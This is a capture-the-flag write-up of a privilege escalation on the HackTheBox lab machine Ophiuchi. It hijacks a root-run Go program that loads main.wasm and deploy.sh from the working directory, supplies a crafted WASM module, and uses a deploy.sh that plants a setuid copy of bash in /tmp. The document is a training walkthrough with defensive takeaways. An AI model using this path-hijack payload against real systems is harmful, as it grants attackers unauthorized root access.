
# HTB Ophiuchi — WASM Privilege Escalation ..beta..

## Overview

The `admin` user can run a Go program as root via `sudo`. 

That program reads `main.wasm` and `deploy.sh` from the **current working directory** — not absolute paths — giving us control over both files.

---

## Analyzing the Go Program

```bash
cat /opt/wasm-functions/index.go
```

Key behavior:
- Reads `main.wasm` from CWD
- Calls the exported `info()` function from the wasm instance
- If `info()` returns `"1"` → runs `deploy.sh` via `/bin/sh`
- If not → prints "Not ready to deploy"

> **Note:** Always run this from a writable directory, not from `~`. The program looks for `main.wasm` relative to CWD and will panic if not found.

---

## Reversing main.wasm

Copy the file locally:

```bash
scp admin@<TARGET_IP>:/opt/wasm-functions/main.wasm .
```

### Tooling — WABT (WebAssembly Binary Toolkit)

```bash
git clone --recursive https://github.com/WebAssembly/wabt
cd wabt && cmake . && make
```

> Requires `cmake`: `sudo apt install cmake`

### Decompile

```bash
./bin/wasm-decompile main.wasm
```

Output:

```text
export function info():int {
  return 0
}
```

The `info()` function returns `0` — that's why the program never reaches `deploy.sh`.

---

## Crafting a Malicious main.wasm

### Option 1 — WasmFiddle (Online, Quick)

1. Go to [https://wasdk.github.io/WasmFiddle/](https://wasdk.github.io/WasmFiddle/)
2. Use this C code:

```c
int info() {
  return 1;
}
```

3. Click **Build**, then download the **Wasm** binary.

### Option 2 — wat2wasm (Local, Reproducible)

Write the WAT source manually:

```wat
(module
  (func $info (export "info") (result i32)
    i32.const 1)
)
```

Compile it:

```bash
./bin/wat2wasm info.wat -o main.wasm
```

Verify:

```bash
./bin/wasm-decompile main.wasm
# export function info():int { return 1 }
```

---

## Crafting deploy.sh

```bash
cat > deploy.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x deploy.sh
```

> Alternatively use a reverse shell one-liner if you prefer an interactive session.

---

## Execution

Run everything from your writable working directory (e.g. `/tmp/exploit/`):

```bash
mkdir /tmp/exploit
cd /tmp/exploit
# copy your crafted main.wasm and deploy.sh here
sudo /usr/bin/go run /opt/wasm-functions/index.go
```

Expected output:

```text
Ready to deploy
```

Then escalate:

```bash
/tmp/rootbash -p
whoami
# root
```

---

## Why This Works

| Factor | Detail |
|---|---|
| Relative path for `main.wasm` | Loaded from CWD, not a fixed path |
| Relative path for `deploy.sh` | Executed via `sh deploy.sh`, not an absolute path |
| `sudo` privileges | The Go binary runs as root, so `deploy.sh` executes as root |

---

## Key Takeaways

- Always audit Go/scripts running as root for **relative path usage**
- WASM binaries are trivially reversible with WABT
- `wat2wasm` is more reliable for lab reproducibility than online tools
